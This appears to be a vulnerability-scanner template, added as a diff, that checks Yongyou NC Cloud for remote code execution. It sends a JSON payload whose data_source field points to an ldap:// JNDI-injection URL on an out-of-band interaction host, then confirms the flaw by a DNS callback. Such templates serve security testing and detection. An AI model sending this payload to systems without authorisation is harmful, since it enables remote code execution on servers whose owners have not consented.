@@ -1,0 +1,29 @@
+id: yongyou-nc-cloud-PMCloudDriveProjectStateServlet-rce
+
+info:
+  name: yongyou-nc-cloud-PMCloudDriveProjectStateServlet-rce
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        POST /service/~aert/PMCloudDriveProjectStateServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        {"data_source":"ldap://{{interactsh-url}}/TomcatBypass/Command/calc","user":"admin","pk_group":"111"}
+
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
